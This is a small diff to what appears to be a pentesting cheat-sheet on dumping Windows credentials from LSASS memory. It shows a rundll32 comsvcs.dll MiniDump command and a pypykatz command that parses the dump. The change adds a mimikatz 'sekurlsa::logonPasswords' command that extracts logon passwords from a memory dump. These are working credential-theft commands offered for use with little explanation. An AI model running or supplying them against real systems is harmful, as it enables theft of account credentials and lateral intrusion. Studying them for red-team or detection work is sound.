@@ -141,7 +141,10 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <ID> C:\lsass.dmp full
 [pypykatz](https://github.com/skelsec/pypykatz)
 
 ```bash
-pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp
+
+
+mimikatz.exe "minidump::minidump C:\Path\To\MemoryDump.dmp" "sekurlsa::logonPasswords" exit
 ```
 #### MSV
 MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. 
